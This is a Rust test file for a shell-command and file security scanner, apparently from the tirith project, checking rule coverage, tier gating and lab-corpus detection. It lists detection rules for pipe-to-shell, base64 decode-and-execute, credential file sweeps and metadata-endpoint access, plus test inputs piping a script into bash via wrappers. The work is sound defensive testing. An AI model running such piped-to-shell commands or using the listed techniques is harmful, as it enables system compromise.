        "unsigned_repo_trust",          // apt --allow-unauthenticated, no URL needed
        "gpg_check_disabled",           // dnf --nogpgcheck, no URL needed
        "dynamic_code_execution",       // file scan, no URL needed
        "obfuscated_payload",           // file scan, no URL needed
        "suspicious_code_exfiltration", // file scan, no URL needed
        "hangul_filler",                // byte-level, no URL needed
        "confusable_text",              // byte-level, no URL needed
        "workflow_unpinned_action",     // CI workflow file scan, no URL needed
        "workflow_dangerous_trigger",   // CI workflow file scan, no URL needed
        "workflow_curl_pipe_shell",     // CI workflow file scan, no URL needed
        "workflow_untrusted_input",     // CI workflow file scan, no URL needed
        "dockerfile_unpinned_image",    // Dockerfile scan, no URL needed
        "package_script_dangerous",     // package.json scan, no URL needed
        "notebook_hidden_content",      // .ipynb scan, no URL needed
        "notebook_suspicious_output",   // .ipynb scan, no URL needed
        "agent_instruction_hidden",     // AI-instruction file scan, no URL needed
        "svg_script_embedded",          // SVG scan, no URL needed
    ]
    .into_iter()
    .collect();

    fn input_has_url(input: &str) -> bool {
        input.contains("://") || input.contains("git@")
    }

    let all_fixtures = load_all_fixtures();

    let mut has_no_url_fixture: HashSet<String> = HashSet::new();
    for (_, fixture) in &all_fixtures {
        if fixture.expected_action == "allow" {
            continue;
        }
        if !input_has_url(&fixture.input) {
            for rule in &fixture.expected_rules {
                has_no_url_fixture.insert(rule.clone());
            }
        }
    }

    let missing: Vec<&&str> = no_url_rules
        .iter()
        .filter(|rule| !has_no_url_fixture.contains(**rule))
        .collect();

    assert!(
        missing.is_empty(),
        "Non-URL-dependent rules that lack a no-URL fixture (tier-1 gap risk):\n{}",
        missing
            .iter()
            .map(|r| format!("  - {r}"))
            .collect::<Vec<_>>()
            .join("\n")
    );
}

#[test]
fn test_extractor_ids_cover_rule_triggers() {
    let ids: HashSet<&str> = tirith_core::extract::extractor_ids()
        .iter()
        .copied()
        .collect();

    // Each rule category requires at least one extractor to trigger tier-1.
    // Map: rule category → required extractor IDs.
    let required_extractors: Vec<(&str, &[&str])> = vec![
        // URL-based rules need at least one URL trigger
        ("hostname rules", &["standard_url"]),
        ("path rules", &["standard_url"]),
        (
            "transport rules",
            &[
                "standard_url",
                "curl",
                "wget",
                "httpie",
                "xh",
                "scp",
                "rsync",
            ],
        ),
        ("ecosystem rules", &["standard_url", "docker_command"]),
        // Command shape rules need their own patterns
        ("pipe-to-interpreter", &["pipe_to_interpreter"]),
        ("base64 decode-execute", &["base64_decode_execute"]),
        ("dotfile overwrite", &["dotfile_overwrite"]),
        ("archive extract", &["archive_extract_sensitive"]),
        ("install commands", &["install_command"]),
        // PowerShell rules
        (
            "powershell commands",
            &[
                "powershell_iwr",
                "powershell_irm",
                "powershell_invoke_webrequest",
                "powershell_invoke_restmethod",
                "powershell_invoke_expression",
            ],
        ),
        // Environment variable detection
        (
            "env var detection",
            &["env_var_dangerous", "env_var_hijack", "env_var_sensitive"],
        ),
        // Network destination detection
        ("metadata endpoint", &["metadata_endpoint"]),
        ("proc_mem_access", &["proc_mem_access"]),
        ("docker_remote_privesc", &["docker_remote_privesc"]),
        ("credential_file_sweep", &["credential_file_sweep"]),
        // Deception triggers
        ("punycode detection", &["punycode_domain"]),
        ("lookalike TLD", &["lookalike_tld"]),
        ("URL shortener", &["url_shortener"]),
        // Credential detection
        (
            "credential detection",
            &[
                "credential_known",
                "credential_private_key",
                "credential_generic",
            ],
        ),
    ];

    let mut missing = Vec::new();
    for (category, required) in &required_extractors {
        for extractor_id in *required {
            if !ids.contains(extractor_id) {
                missing.push(format!(
                    "{category}: missing extractor '{extractor_id}' in PATTERN_TABLE"
                ));
            }
        }
    }

    assert!(
        missing.is_empty(),
        "PATTERN_TABLE in build.rs is missing extractors needed by rule categories:\n{}",
        missing.join("\n  ")
    );
}

#[test]
fn test_tier1_does_not_gate_findings() {
    let all_fixtures = load_all_fixtures();
    let mut gated = Vec::new();

    for (file, fixture) in &all_fixtures {
        if fixture.expected_action == "allow" {
            continue;
        }

        let shell = fixture
            .shell
            .parse::<ShellType>()
            .unwrap_or(ShellType::Posix);

        let scan_context = match fixture.context.as_str() {
            "exec" => ScanContext::Exec,
            "paste" => ScanContext::Paste,
            "file" => ScanContext::FileScan,
            _ => continue,
        };

        let raw_bytes = if !fixture.raw_bytes.is_empty() {
            Some(fixture.raw_bytes.clone())
        } else if scan_context == ScanContext::Paste || scan_context == ScanContext::FileScan {
            Some(fixture.input.as_bytes().to_vec())
        } else {
            None
        };

        let file_path = fixture.file_path.as_ref().map(std::path::PathBuf::from);

        let ctx = AnalysisContext {
            input: fixture.input.clone(),
            shell,
            scan_context,
            raw_bytes,
            interactive: true,
            cwd: None,
            file_path,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        };

        let verdict = engine::analyze(&ctx);

        if verdict.tier_reached < 3 {
            gated.push(format!(
                "{file}:{} — tier_reached={}, expected_action={}, input={:?}",
                fixture.name, verdict.tier_reached, fixture.expected_action, fixture.input
            ));
        }
    }

    assert!(
        gated.is_empty(),
        "Tier-1 gated {} fixture(s) that should produce findings (security bug!):\n  {}",
        gated.len(),
        gated.join("\n  ")
    );
}

/// Non-ASCII in paste is only an analysis trigger, never a sole WARN/BLOCK
/// reason. A paste containing only non-ASCII characters (no URLs, no
/// commands) must resolve to Allow.
#[test]
fn test_non_ascii_paste_not_sole_warn() {
    let non_ascii_inputs = [
        "café au lait",
        "日本語テスト",
        "Ünïcödé",
        "こんにちは世界",
        "مرحبا",
    ];

    for input in &non_ascii_inputs {
        let raw_bytes = input.as_bytes().to_vec();
        let ctx = AnalysisContext {
            input: input.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Paste,
            raw_bytes: Some(raw_bytes),
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        };
        let verdict = engine::analyze(&ctx);
        assert_eq!(
            verdict.action,
            Action::Allow,
            "Non-ASCII paste '{}' should not produce WARN/BLOCK by itself, got {:?} with findings: {:?}",
            input,
            verdict.action,
            verdict.findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }
}

/// The tier-1 regex must match every name in the shared `INTERPRETERS`
/// constant — drift between the tier-1 gate (build.rs) and the tier-3
/// detection (command.rs) would silently gate real attacks.
#[test]
fn test_tier1_matches_all_interpreters() {
    use tirith_core::extract::{tier1_scan, ScanContext};
    use tirith_core::rules::command::INTERPRETERS;

    for name in INTERPRETERS {
        let input = format!("cat /tmp/s.sh | {}", name);
        assert!(
            tier1_scan(&input, ScanContext::Exec),
            "Tier-1 scan does not match plain interpreter '{}' in '{}'",
            name,
            input
        );
    }

    assert!(
        tier1_scan("cat /tmp/s.sh | 'sudo' bash", ScanContext::Exec),
        "Tier-1 scan must match quoted wrapper 'sudo'"
    );
    assert!(
        tier1_scan(r#"cat /tmp/s.sh | "env" bash"#, ScanContext::Exec),
        "Tier-1 scan must match quoted wrapper \"env\""
    );

    assert!(
        tier1_scan("cat /tmp/s.sh | command sudo bash", ScanContext::Exec),
        "Tier-1 scan must match wrapper chain"
    );

    assert!(
        tier1_scan("cat /tmp/s.sh | $'bash'", ScanContext::Exec),
        "Tier-1 scan must match ANSI-C quoted interpreter"
    );

    assert!(
        tier1_scan("cat /tmp/s.sh | BASH", ScanContext::Exec),
        "Tier-1 scan must match uppercase interpreter"
    );
}

// ---------------------------------------------------------------------------
// Lab corpus safeguard (M5 / Chunk 3)
//
// The `tirith lab` corpus at crates/tirith/assets/lab_corpus.toml doubles as
// a fixture set: every non-allow scenario must produce at least one finding
// (i.e. tier-3 rules actually ran). This catches the same class of bug as
// `test_tier1_does_not_gate_findings` but for the lab corpus, ensuring future
// corpus expansion does not silently lose detection coverage.
//
// The corpus lives inside the `tirith` crate (so `cargo package -p tirith`
// can embed it via `include_str!`); this test reads it via a
// `CARGO_MANIFEST_DIR`-relative path that walks across the workspace into the
// sibling crate.
// ---------------------------------------------------------------------------

#[derive(Debug, Deserialize)]
struct LabCorpusFile {
    #[serde(rename = "scenario")]
    scenarios: Vec<LabScenario>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct LabScenario {
    name: String,
    description: String,
    input: String,
    context: String,
    #[serde(default = "default_lab_shell")]
    shell: String,
    expected_action: String,
    #[serde(default)]
    tags: Vec<String>,
    #[serde(default)]
    raw_bytes: Vec<u8>,
}

fn default_lab_shell() -> String {
    "posix".to_string()
}

#[test]
fn test_lab_corpus_reaches_tier3() {
    // CARGO_MANIFEST_DIR is `crates/tirith-core`; walk to the workspace root
    // and into the sibling `tirith` crate where the corpus now lives.
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("tirith")
        .join("assets")
        .join("lab_corpus.toml");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read {}: {}", path.display(), e));
    let file: LabCorpusFile = toml::from_str(&content)
        .unwrap_or_else(|e| panic!("Failed to parse {}: {}", path.display(), e));

    assert!(
        !file.scenarios.is_empty(),
        "lab_corpus.toml must define at least one scenario"
    );

    for scenario in &file.scenarios {
        // Use the shared `FromStr` impls in tirith-core so this safeguard and
        // `crates/tirith/src/cli/lab.rs::run` consume one parse table. Both
        // sites still panic-on-unknown to surface corpus typos loudly.
        let shell: ShellType = scenario.shell.parse().unwrap_or_else(|_| {
            panic!(
                "Lab scenario '{}': unknown shell '{}'",
                scenario.name, scenario.shell
            )
        });

        let scan_context: ScanContext = scenario.context.parse().unwrap_or_else(|_| {
            panic!(
                "Lab scenario '{}': unknown context '{}'",
                scenario.name, scenario.context
            )
        });

        let raw_bytes = match (scenario.raw_bytes.as_slice(), scan_context) {
            ([], ScanContext::Paste) => Some(scenario.input.as_bytes().to_vec()),
            ([], _) => None,
            (bytes, _) => Some(bytes.to_vec()),
        };

        let ctx = AnalysisContext {
            input: scenario.input.clone(),
            shell,
            scan_context,
            raw_bytes,
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        };

        let verdict = engine::analyze(&ctx);

        let expected: Action = scenario.expected_action.parse().unwrap_or_else(|_| {
            panic!(
                "Lab scenario '{}': unknown expected_action '{}'",
                scenario.name, scenario.expected_action
            )
        });

        // Bucket Warn/WarnAck together — both are user-visible warnings.
        let action_bucket = |a: Action| match a {
            Action::Warn | Action::WarnAck => Action::Warn,
            other => other,
        };
        assert_eq!(
            action_bucket(verdict.action),
            expected,
            "Lab scenario '{}': expected {:?} but engine returned {:?} ({} findings)",
            scenario.name,
            expected,
            verdict.action,
            verdict.findings.len()
        );

        // The core safeguard: any scenario that isn't an allow must reach
        // tier-3 and produce at least one finding. If a future refactor
        // accidentally gates a rule out of the hot path, this fires.
        if expected != Action::Allow {
            // First: the verdict actually reached the tier-3 rule layer.
            // The test name promises "reaches_tier3" — pin the contract
            // explicitly rather than inferring it from the presence of
            // findings (CR follow-up). A future regression that gates the
            // engine at tier-1 / tier-2 would otherwise still pass as long
            // as some finding sneaks out via a byte-scan path.
            assert!(
                verdict.tier_reached >= 3,
                "Lab scenario '{}' (expected {:?}): engine reached tier {} but the corpus requires tier-3 coverage",
                scenario.name,
                expected,
                verdict.tier_reached,
            );
            assert!(
                !verdict.findings.is_empty(),
                "Lab scenario '{}' (expected {:?}): tier-3 produced no findings — corpus has lost detection coverage",
                scenario.name,
                expected
            );
        }
    }
}
